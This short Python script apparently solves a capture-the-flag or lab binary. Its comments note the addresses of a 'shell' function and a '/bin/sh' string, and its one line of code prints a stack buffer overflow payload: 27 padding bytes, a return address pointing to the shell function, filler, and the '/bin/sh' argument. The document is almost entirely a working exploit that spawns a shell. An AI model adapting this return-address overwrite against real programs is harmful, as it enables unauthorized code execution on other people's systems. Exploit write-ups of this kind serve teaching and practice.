# 0x080486bd shell address
# 0x080487d0 "/bin/sh" address


# 27 is the number of characters needed to overwrite the return address, then
# we use the address of shell

# To provide shell the exec_string variable as a parameter we must enter it 8
# bytes after the function address
# 0x80486c3 <shell+6>: mov    eax,DWORD PTR [ebp+0x8]

print('A' * 27 + '\xbd\x86\x04\x08' + 'AAAA' + '\xd0\x87\x04\x08')
